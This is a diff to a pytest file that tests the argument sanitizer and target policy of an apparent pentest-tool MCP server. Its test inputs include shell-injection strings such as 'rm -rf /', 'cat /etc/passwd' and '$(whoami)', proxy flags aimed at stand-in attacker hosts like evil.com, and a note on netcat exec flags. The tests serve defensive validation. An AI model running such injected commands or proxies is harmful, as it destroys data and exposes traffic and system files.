@@ -106,8 +106,6 @@ class TestSanitizeArgs:
     @pytest.mark.parametrize(
         "malicious",
         [
-            "test; rm -rf /",
-            "target & whoami",
             "host | cat /etc/passwd",
             "arg `id`",
             "file $(whoami)",
@@ -115,6 +113,7 @@ class TestSanitizeArgs:
         ],
     )
     def test_shell_injection_blocked(self, malicious: str) -> None:
+        """Pipe and command-substitution stay blocked (| is run_pipeline-only)."""
         with pytest.raises(ValueError, match="blocked shell metacharacters"):
             sanitize_args(malicious)
 
@@ -129,6 +128,25 @@ class TestSanitizeArgs:
     )
     def test_dollar_angle_brackets_allowed(self, safe: str) -> None:
         """Bare $, >, < are safe without shell — needed for regex/awk/XML."""
+        result = sanitize_args(safe)
+        assert len(result) > 0
+
+    @pytest.mark.parametrize(
+        "safe",
+        [
+            "http://10.0.0.1/app?id=1&token=abc",  # '&' in a URL query string
+            "http://10.0.0.1/a?x=1&y=2;z=3",  # '&' and ';' together
+            "config;backup",  # ';' as a literal value
+        ],
+    )
+    def test_separators_allowed_without_shell(self, safe: str) -> None:
+        """';' and '&' are harmless literals without a shell.
+
+        They are command separators only a shell would interpret; since execution
+        is always create_subprocess_exec (never shell=True), they pass straight to
+        the tool. This keeps the executor consistent with guided_assessment, which
+        plans multi-param URLs. Pipe and command substitution stay blocked.
+        """
         result = sanitize_args(safe)
         assert len(result) > 0
 
@@ -361,6 +379,46 @@ class TestCheckPolicy:
         """Unambiguous target flags (--target, -u, --url) must still be validated."""
         with pytest.raises(ValueError, match="not in a private/local"):
             check_policy("sqlmap", ["-u", "http://example.com/page?id=1"])
+
+    @patch("mcp_server.security._allow_external", return_value=False)
+    def test_proxy_flag_external_host_blocked(self, _mock_ext) -> None:
+        """A proxy flag pointing at an external host must be blocked."""
+        with pytest.raises(ValueError, match="proxy target"):
+            check_policy("curl", ["--proxy", "http://evil.com:8080", "http://10.0.0.1/"])
+
+    @patch("mcp_server.security._allow_external", return_value=False)
+    def test_proxy_flag_extension_launder_blocked(self, _mock_ext) -> None:
+        """A proxy host laundered as 'host/path.ext' must not slip the file heuristic."""
+        with pytest.raises(ValueError, match="proxy target"):
+            check_policy("curl", ["-x", "attacker.example/p.txt", "http://10.0.0.1/"])
+
+    @patch("mcp_server.security._allow_external", return_value=False)
+    def test_proxy_short_flag_attached_value_blocked(self, _mock_ext) -> None:
+        """curl accepts -xVALUE; it must validate like '-x VALUE'."""
+        with pytest.raises(ValueError, match="proxy target"):
+            check_policy("curl", ["-xhttp://evil.com:8080", "http://10.0.0.1/"])
+        with pytest.raises(ValueError, match="proxy target"):
+            check_policy("curl", ["-x=evil.com:8080", "http://10.0.0.1/"])
+
+    @patch("mcp_server.security._allow_external", return_value=False)
+    def test_proxy_flag_other_tools_blocked(self, _mock_ext) -> None:
+        """Proxy flags on ffuf/nuclei must validate the upstream host too."""
+        with pytest.raises(ValueError, match="proxy target"):
+            check_policy("ffuf", ["-x", "http://evil.com:8080", "-u", "http://10.0.0.1/FUZZ"])
+        with pytest.raises(ValueError, match="proxy target"):
+            check_policy("nuclei", ["-proxy", "evil.com:3128", "-u", "http://10.0.0.1/"])
+
+    @patch("mcp_server.security._allow_external", return_value=False)
+    def test_proxy_flag_private_host_allowed(self, _mock_ext) -> None:
+        """Private/loopback proxies (incl. with userinfo/scheme) stay allowed."""
+        check_policy("curl", ["-x", "http://127.0.0.1:8080", "http://10.0.0.1/"])
+        check_policy("curl", ["-x", "socks5://10.0.0.2:9050", "http://10.0.0.1/"])
+        check_policy("curl", ["-x", "user:pass@10.0.0.2:8080", "http://10.0.0.1/"])
+
+    @patch("mcp_server.security._allow_external", return_value=False)
+    def test_output_file_not_treated_as_proxy(self, _mock_ext) -> None:
+        """A benign output file must not be mistaken for a proxy target."""
+        check_policy("curl", ["-o", "report.json", "http://10.0.0.1/"])
 
     # ----- nc/ncat/netcat -e/-c/--exec/--sh-exec/--lua-exec are local RCE (C1) -----
 
@@ -597,7 +655,7 @@ class TestExecuteTool:
     @pytest.mark.asyncio
     async def test_shell_injection_returns_error(self, tools_db) -> None:
         with patch("shutil.which", return_value="/usr/bin/nmap"):
-            result = await execute_tool("nmap", "10.0.0.1; rm -rf /", tools_db)
+            result = await execute_tool("nmap", "10.0.0.1 | rm -rf /", tools_db)
         assert result["exit_code"] == -1
         assert "blocked shell metacharacters" in result["stderr"]
 
@@ -672,7 +730,7 @@ class TestExecuteToolRemote:
     @pytest.mark.asyncio
     async def test_shell_injection_blocked(self, tools_db, remote_config) -> None:
         remote_config.add_host(name="kali", hostname="10.0.0.5")
-        result = await execute_tool_remote("nmap", "10.0.0.1; rm -rf /", tools_db, remote_config, "kali")
+        result = await execute_tool_remote("nmap", "10.0.0.1 | rm -rf /", tools_db, remote_config, "kali")
         assert result["exit_code"] == -1
         assert "blocked shell metacharacters" in result["stderr"]
         assert result["remote"] is True
@@ -1333,7 +1391,7 @@ class TestExecutePipeline:
 
     @pytest.mark.asyncio
     async def test_shell_injection_in_step_blocked(self, tools_db) -> None:
-        steps = [{"tool": "cat", "args": "file; rm -rf /"}]
+        steps = [{"tool": "cat", "args": "file | rm -rf /"}]
         with patch("shutil.which", return_value="/usr/bin/fake"):
             result = await execute_pipeline(steps, tools_db)
         assert result["exit_code"] == -1
